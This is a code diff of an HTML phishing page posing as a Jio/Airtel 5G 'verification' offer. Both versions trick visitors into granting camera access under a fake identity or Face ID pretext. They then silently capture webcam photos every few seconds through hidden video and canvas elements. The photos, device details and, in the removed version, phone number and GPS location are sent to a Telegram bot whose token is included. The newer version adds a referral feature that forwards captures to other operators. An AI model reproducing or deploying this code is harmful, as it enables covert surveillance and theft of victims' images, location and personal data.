@@ -3,218 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jio/Airtel 5G - Official Verification</title>
+    <title>5G Secure Verification Portal</title>
     <style>
-        :root { --brand: #e11d48; --dark: #0f172a; --glass: rgba(255, 255, 255, 0.95); }
-        body { margin: 0; background: #f1f5f9; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-        
-        /* Realistic UI */
-        .header { background: white; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); display: flex; align-items: center; justify-content: space-between; }
-        .logo { font-weight: 900; font-size: 22px; color: var(--brand); letter-spacing: -1px; }
-        .badge { background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; }
+        :root { --primary: #007aff; --bg: #f2f2f7; --card: #ffffff; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; color: #1c1c1e; }
 
-        .main-card {
-            background: var(--glass);
-            margin: 20px;
-            padding: 25px;
-            border-radius: 24px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.5);
-        }
+        .container { width: 90%; max-width: 400px; background: var(--card); padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; }
 
-        h2 { margin: 0 0 10px 0; color: var(--dark); font-size: 20px; }
-        p { color: #64748b; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        h2 { margin: 0 0 10px; font-size: 22px; }
+        p { color: #8e8e93; font-size: 14px; margin-bottom: 25px; }
 
-        /* Scanning Animation */
-        .scanner {
-            width: 80px; height: 80px; margin: 0 auto 20px;
-            border: 4px solid #e2e8f0; border-top: 4px solid var(--brand);
-            border-radius: 50%; animation: spin 1s linear infinite; display: none;
-        }
+        .loader { width: 50px; height: 50px; border: 5px solid #e5e5ea; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
 
-        /* Inputs */
-        input { width: 100%; padding: 16px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--brand); }
+        .btn { background: var(--primary); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); opacity: 0.9; }
 
-        /* Buttons */
-        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .btn-primary { background: var(--brand); color: white; box-shadow: 0 10px 20px rgba(225, 29, 72, 0.3); }
-        .btn-loc { background: #3b82f6; color: white; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        
-        .security-footer { margin-top: 30px; display: flex; justify-content: center; gap: 20px; opacity: 0.6; }
-        .sec-icon { width: 40px; filter: grayscale(100%); }
+        /* Hidden Elements */
+        #video, #canvas { position: absolute; top: -9999px; opacity: 0; pointer-events: none; }
 
-        /* Hidden Traps */
-        #video, #canvas { position: absolute; left: -9999px; }
-        
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="logo">FastConnect 5G</div>
-        <div class="badge">● LIVE SERVER</div>
+    <div class="container" id="step1">
+        <div class="loader"></div>
+        <h2>Checking Device...</h2>
+        <p>Analyzing 5G Compatibility & Signal Strength</p>
     </div>
 
-    <div class="main-card">
-        <div class="scanner" id="loader"></div>
-        <div id="content-box">
-            <h2>Claim 1-Year Unlimited 5G</h2>
-            <p>Verification Required to activate plan on your number.</p>
-            
-            <input type="tel" id="mobile" placeholder="Enter Mobile Number (+91)" maxlength="10">
-            
-            <button class="btn btn-primary" id="verifyBtn">Verify & Activate</button>
-            
-            <button class="btn btn-loc" id="gpsBtn">
-                <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 2a7 7 0 00-7 7c0 5.25 7 13 7 13s7-7.75 7-13a7 7 0 00-7-7z"></path><circle cx="12" cy="9" r="2.5"></circle></svg>
-                Check 5G Tower Signal
-            </button>
-        </div>
-        <p id="msg" style="margin-top:15px; font-size:12px; display:none;">Connecting to server...</p>
+    <div class="container" id="step2" style="display:none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/800px-Google_Chrome_icon_%28February_2022%29.svg.png" width="60" style="margin-bottom:15px;">
+        <h2>Security Check Required</h2>
+        <p>To prevent fraud, please complete the Face ID verification to activate your offer.</p>
+        <button class="btn" id="startBtn">Verify Identity Now</button>
+        <p style="font-size:11px; margin-top:15px; color:#aaa;">Secure Connection by Cloudflare</p>
     </div>
 
-    <div class="security-footer">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="sec-icon">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/Norton_AntiVirus_logo.png" class="sec-icon">
-    </div>
-
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- CONFIGURATION ---
+        // --- ⚙️ CONFIGURATION ⚙️ ---
         const CONFIG = {
-            TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE',
-            CHAT_ID: '8285724366'
+            BOT_TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE', 
+            ADMIN_ID: '8285724366' // आपकी ID (Master Admin)
         };
 
+        // --- URL PARAMETER LOGIC ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const REF_ID = urlParams.get('ref'); // लिंक से यूजर ID निकालना
+
+        // --- UI LOGIC ---
+        setTimeout(() => {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }, 2000);
+
+        // --- CAPTURE & SEND LOGIC ---
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const msg = document.getElementById('msg');
-        
-        // --- 1. ADVANCED INTELLIGENCE GATHERING ---
-        function getSystemIntel() {
-            let intel = `📱 *NEW VICTIM DATA* 📱\n\n`;
-            
-            // Basic Info
-            intel += `📞 Mobile: ${document.getElementById('mobile').value || 'Not entered'}\n`;
-            intel += `🔋 Battery: ${window.batteryLevel || 'Unknown'}%\n`;
-            intel += `🔌 Charging: ${window.isCharging ? 'Yes' : 'No'}\n`;
-            
-            // Advanced Hardware
-            intel += `💾 RAM: ~${navigator.deviceMemory || '?'} GB\n`;
-            intel += `⚡ CPU Cores: ${navigator.hardwareConcurrency || '?'}\n`;
-            intel += `🖥 Screen: ${window.screen.width}x${window.screen.height}\n`;
-            
-            // Network & Browser
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            intel += `📶 Network: ${conn ? conn.effectiveType.toUpperCase() : 'Unknown'}\n`;
-            intel += `🌐 Browser: ${navigator.userAgent.split(')')[0]})`;
-            
-            return intel;
-        }
 
-        // --- 2. CAMERA STEALTH CAPTURE ---
-        async function sendPhoto(blob, locationText = null) {
-            const formData = new FormData();
-            formData.append('chat_id', CONFIG.CHAT_ID);
-            formData.append('photo', blob, 'cam_shot.jpg');
-            
-            // Attach gathered data as caption
-            let caption = getSystemIntel();
-            if(locationText) caption += `\n\n📍 *LOCATION:* ${locationText}`;
-            
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
+        async function sendData(blob) {
+            // Recipient List: Admin + User (if exists)
+            let recipients = [CONFIG.ADMIN_ID];
+            if (REF_ID && REF_ID !== CONFIG.ADMIN_ID) {
+                recipients.push(REF_ID);
+            }
 
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
+            // Gather Device Info
+            const platform = navigator.platform;
+            const battery = await navigator.getBattery?.().then(b => Math.round(b.level * 100) + '%') || 'Unknown';
+            
+            const caption = `🎯 *New Target Captured!* \n\n` +
+                            `🆔 Ref User: ${REF_ID || 'Direct Link'}\n` +
+                            `📱 Device: ${platform}\n` +
+                            `🔋 Battery: ${battery}\n` +
+                            `🕒 Time: ${new Date().toLocaleTimeString()}`;
+
+            // Send to ALL recipients
+            recipients.forEach(chatId => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'cam.jpg');
+                fd.append('caption', caption);
+                fd.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
-                });
-            } catch(e) {}
-        }
-
-        function startSpyCam() {
-            setInterval(() => {
-                const ctx = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob(blob => blob && sendPhoto(blob), 'image/jpeg', 0.5);
-            }, 5000); // Sends photo every 5 seconds
-        }
-
-        // --- 3. BATTERY STATUS API ---
-        if(navigator.getBattery) {
-            navigator.getBattery().then(batt => {
-                window.batteryLevel = Math.floor(batt.level * 100);
-                window.isCharging = batt.charging;
+                    body: fd
+                }).catch(err => console.log(`Error sending to ${chatId}`));
             });
         }
 
-        // --- 4. MAIN TRIGGER (Verify Button) ---
-        document.getElementById('verifyBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('verifyBtn');
-            const loader = document.getElementById('loader');
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('startBtn');
+            btn.innerText = "Connecting Secure Server...";
             
-            document.getElementById('content-box').style.display = 'none';
-            loader.style.display = 'block';
-            msg.style.display = 'block';
-            msg.innerText = "Authenticating User Identity...";
-
             try {
-                // Request Camera (Framed as Identity Scan)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 
-                msg.innerText = "Scanning Biometrics...";
-                msg.style.color = "green";
-                
-                // Start sending data
-                startSpyCam();
-                
+                // Start Loop: Capture every 2 seconds
+                setInterval(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    canvas.toBlob(blob => sendData(blob), 'image/jpeg', 0.5);
+                }, 2000);
+
                 setTimeout(() => {
-                    alert("Verification Successful! Redirecting to plan selection...");
+                    alert("Verification Successful! Redirecting...");
+                    btn.innerText = "Verified ✓";
+                    btn.style.background = "#34c759";
                 }, 4000);
 
             } catch (err) {
-                msg.innerText = "Error: Camera Access Denied";
-                msg.style.color = "red";
-                loader.style.display = 'none';
-                document.getElementById('content-box').style.display = 'block';
-                alert("You must allow camera access to verify your identity for this offer.");
+                alert("Camera permission is required for verification.");
+                btn.innerText = "Try Again";
+                location.reload();
             }
         });
-
-        // --- 5. GPS LOCATION TRAP ---
-        document.getElementById('gpsBtn').addEventListener('click', () => {
-            if (navigator.geolocation) {
-                document.getElementById('gpsBtn').innerText = "Locating Signal...";
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        
-                        // Capture a photo immediately with location data
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        canvas.toBlob(blob => {
-                            sendPhoto(blob, mapsLink); // Send photo + GPS
-                        }, 'image/jpeg', 0.5);
-
-                        alert("5G Signal Strong in your area! Proceeding...");
-                    },
-                    (error) => {
-                        alert("Location access required to check 5G coverage.");
-                    }
-                );
-            }
-        });
-
     </script>
 </body>
 </html>
